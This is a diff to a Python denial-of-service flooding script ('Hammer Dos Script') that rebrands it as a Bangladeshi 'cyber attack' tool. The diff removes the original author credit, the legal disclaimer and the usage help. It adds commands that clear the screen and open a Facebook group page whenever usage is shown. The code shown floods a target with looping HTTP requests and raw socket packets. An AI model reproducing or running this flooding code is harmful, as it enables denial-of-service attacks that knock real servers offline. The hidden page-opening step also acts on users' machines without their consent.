@@ -1,11 +1,6 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-# python 3.3.2+ Hammer Dos Script v.1
-# by Can Yalçın
-# only for legal purpose
-
-
 from queue import Queue
 from optparse import OptionParser
 import time,sys,socket,threading,logging,urllib.request,random
@@ -35,7 +30,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94m Bot Attacking Start SiR...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -49,13 +44,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[92m ~Bot Request Sand SiR~ \033[0m")
 			else:
 				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
+				print("\033[91m Shutdown SiR \033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
+		print("\033[91m No Connection Server Maybe Down SiR\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -85,16 +80,10 @@ logo = ("""\033[1;92m
 \033[1;93m ۝࿐\033[1;97m════════════════════════════════════════\033[1;93m࿐۝""")
 
 def usage():
+	os.system("clear")
+	os.system('xdg-open https://facebook.com/groups/551365756758487/')
 	print(logo)
-	print(''' Bangladesh Hacker Hasan Islam ''')
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
+	print(''' Indian Cyber Attark From Bangladesh Hacker ''')
 	sys.exit()
 
 
@@ -173,4 +162,4 @@ if __name__ == '__main__':
 			w.put(item)
 		q.join()
 		w.join()
-	
+			
